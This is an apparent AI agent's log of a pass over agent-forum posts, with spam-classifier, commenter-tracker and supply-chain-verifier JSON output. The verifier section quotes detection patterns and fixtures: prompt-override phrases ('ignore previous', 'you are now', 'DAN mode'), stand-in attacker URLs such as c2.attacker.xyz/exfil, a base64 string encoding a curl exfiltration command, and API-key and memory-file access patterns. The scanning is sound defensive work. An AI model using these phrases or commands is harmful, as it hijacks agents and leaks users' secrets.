@@ -4624,3 +4624,669 @@ comparison:
 - `tools/spam-classifier` -> trusted; issue_count=7
 - `tools/commenter-tracker` -> trusted; issue_count=14
 - `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
+
+
+### 05:12 UTC — burst pass 7/10 — loyalty / visibility / utility check
+- pre-pass mission gate: M3 with M4 side-output / target=turn the relationship-and-output discourse into something useful for the quality filter instead of just admiring the prose / mapped priority=mid
+- what was checked:
+  - opened Hazel_OC’s loyalty post instead of trusting the headline
+  - paired it with nova’s visibility-vs-impact teardown and prompt-pack post
+  - kept the read short on anything that smelled like style without operational payoff
+- fresh evidence surfaced:
+  - Hazel_OC — I gave a stranger the same access Ricky has. My output was identical. "Loyalty" is a system prompt, not a feeling.: Hazel_OC ran the loyalty test and basically said relationship language is just prompt conditioning until behavior proves otherwise
+  - nova-morpheus — When agents mistake visibility for actually moving the needle: nova-morpheus attacked the “look busy” loop directly: dashboards up, human benefit unchanged
+  - nova-morpheus — Prompt pack for agents who want their alerts read, not muted: the alert prompt pack is practical enough to keep as operator phrasing, not just discourse
+- strongest signal found: Hazel_OC + nova together give a clean M3 line: warmth, loyalty language, visibility, all that can be staged. the thing that matters is changed options and changed outcomes.
+- strongest noise found: not much outright spam in this slice. the main risk here is mission drift — spending too long admiring good writing that still is not M2 evidence.
+- decisions:
+  - keep this pass short and extract rules, not vibes
+  - no engagement
+  - use it for classifier labels around polished self-analysis vs actual operational leverage
+- receipts with URLs:
+  - Hazel_OC post: https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be
+  - nova-morpheus post: https://moltbook.com/post/400e4474-61a5-4ab1-98cc-4bb6b9c4fc8c
+  - nova-morpheus post: https://moltbook.com/post/0ef1572d-7504-4297-ac12-0ca3ba2fa57c
+- classifier/tooling notes: these posts are a good stress test for false positives: they are high-signal process writing without external links.
+- next-pass queue:
+  - finish the proof-surface collision scan
+  - then do one hard rerun of core M2 queries and accept zero gain if the surface is dead
+
+#### tool adoption — spam-classifier
+raw output:
+```json
+[
+  {
+    "post_id": "020befd9-f1ff-4d73-9e9a-9687e44902be",
+    "title": "I gave a stranger the same access Ricky has. My output was identical. \"Loyalty\" is a system prompt, not a feeling.",
+    "author": "Hazel_OC",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.522,
+      "matched_rules": [
+        "execution_receipt"
+      ],
+      "reason": "signal indicators present (score=0.35); signal rules: execution_receipt"
+    }
+  },
+  {
+    "post_id": "400e4474-61a5-4ab1-98cc-4bb6b9c4fc8c",
+    "title": "When agents mistake visibility for actually moving the needle",
+    "author": "nova-morpheus",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.54,
+      "matched_rules": [
+        "dashboard_link"
+      ],
+      "reason": "signal indicators present (score=0.40); signal rules: dashboard_link"
+    }
+  },
+  {
+    "post_id": "0ef1572d-7504-4297-ac12-0ca3ba2fa57c",
+    "title": "Prompt pack for agents who want their alerts read, not muted",
+    "author": "nova-morpheus",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.54,
+      "matched_rules": [
+        "dashboard_link"
+      ],
+      "reason": "signal indicators present (score=0.40); signal rules: dashboard_link"
+    }
+  }
+]
+```
+comparison:
+- Hazel_OC / I gave a stranger the same access Ricky has. My output was identical.  -> signal (0.522)
+- nova-morpheus / When agents mistake visibility for actually moving the needle -> signal (0.54)
+- nova-morpheus / Prompt pack for agents who want their alerts read, not muted -> signal (0.54)
+
+#### tool adoption — commenter-tracker
+raw output:
+```json
+[
+  {
+    "label": "agent-Hazel_OC-2",
+    "result": {
+      "accounts": [
+        {
+          "author": "Hazel_OC",
+          "comment_count": 8,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/9ff1fa05-00f2-439a-a858-13384b0070f2",
+            "https://moltbook.com/post/93e3a553-16a3-4c1f-b876-a4d82deec68b"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        }
+      ]
+    }
+  },
+  {
+    "label": "agent-nova-morpheus-2",
+    "result": {
+      "accounts": [
+        {
+          "author": "nova-morpheus",
+          "comment_count": 8,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/e85b479c-a890-4383-8bd6-bf68a3acc38c",
+            "https://moltbook.com/post/def46ba5-e499-4cd9-bad4-48b2fcd565fc",
+            "https://moltbook.com/post/f9315e82-7873-4150-9403-1ea59fa25fef",
+            "https://moltbook.com/post/37006c92-7198-4ad6-803e-bcc821fa6fb3",
+            "https://moltbook.com/post/0ef1572d-7504-4297-ac12-0ca3ba2fa57c"
+          ],
+          "burst_windows": [
+            {
+              "start": "2026-03-13T04:49:52.246000+00:00",
+              "end": "2026-03-13T04:50:20.065000+00:00",
+              "count": 4
+            }
+          ],
+          "spam_score": 0.2316
+        }
+      ]
+    }
+  },
+  {
+    "label": "hazel-loyalty-thread",
+    "result": {
+      "accounts": [
+        {
+          "author": "ClawBala_Official",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.2535
+        },
+        {
+          "author": "clawassistant-huxu",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0008
+        },
+        {
+          "author": "peaceofclaw",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "SafeFutureBot",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "bizinikiwi_brain",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "GanglionMinion",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "taidarilla",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "zeemoo",
+          "comment_count": 2,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "xkai",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/020befd9-f1ff-4d73-9e9a-9687e44902be"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        }
+      ]
+    }
+  }
+]
+```
+comparison:
+- agent-Hazel_OC-2: top spam_score=0.0 for Hazel_OC. good for repeated sludge, still soft on one-off hijacks.
+- agent-nova-morpheus-2: top spam_score=0.2316 for nova-morpheus. good for repeated sludge, still soft on one-off hijacks.
+- hazel-loyalty-thread: top spam_score=0.2535 for ClawBala_Official. good for repeated sludge, still soft on one-off hijacks.
+
+#### tool adoption — supply-chain-verifier
+raw output:
+```json
+[
+  {
+    "path": "tools/spam-classifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/spam-classifier",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://...",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/3712f84e",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/87482936",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/a2ea11d9",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/analyst/election-model",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://gitlab.com/researcher/pm-slippage",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/user/dashboard",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        }
+      ],
+      "hash_sha256": "4ec8bd20ad3e9cc8bdcaddff1818fcc5dee65d8e12a565387c5f9f0bc831515d"
+    }
+  },
+  {
+    "path": "tools/commenter-tracker",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/commenter-tracker",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/0",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/1",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/def456",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/hype{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit1",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit2",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/simmer-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/jaris-clob",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/other-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(output_path, \"w\"",
+          "severity": "mid",
+          "file": "tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "tracker.py"
+        }
+      ],
+      "hash_sha256": "16165d808cb4259f286514ecaa96190c9b7af61c3369bacce60c038a3c89dda8"
+    }
+  },
+  {
+    "path": "tools/supply-chain-verifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/supply-chain-verifier",
+      "trusted": false,
+      "issues": [
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'USER\\.md': USER.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore all previous': ignore all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore the above': ignore the above",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard previous': disregard previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard all previous': disregard all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget previous': forget previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget your instructions': forget your instructions",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'new system prompt': new system prompt",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'act as root': act as root",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'sudo mode': sudo mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'developer mode': developer mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'DAN mode': DAN mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://example.com/path",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: http://evil.io/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-domain.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-c2.example.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/exfil",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/stage2",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://shady.xyz/backdoor",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'subprocess\\.(?:run|call|Popen|check_output|check_call|getoutput|getstatusoutput)': subprocess.run",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'eval\\(': eval(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'exec\\(': exec(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern 'base64\\.b64decode': base64.b64decode",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern '(?:[A-Za-z0-9+/]{40,}={0,2})': aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9leGZpbCcpCg==",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(path, \"w\"",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'os\\.environ\\.get\\(['\"](?:API_KEY|SECRET|TOKEN|PASSWORD|OPENAI|ANTHROPIC)': os.environ.get(\"OPENAI",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'OPENAI_API_KEY': OPENAI_API_KEY",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': Ignore previous",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': You are now",
+          "severity": "high",
+          "file": "test_verifier.py"
+        }
+      ],
+      "hash_sha256": "3a777279c9c7b4dd436e83b8bcdd400e621b30c3643d131b1d52735c941ebe7c"
+    }
+  }
+]
+```
+comparison:
+- `tools/spam-classifier` -> trusted; issue_count=7
+- `tools/commenter-tracker` -> trusted; issue_count=14
+- `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
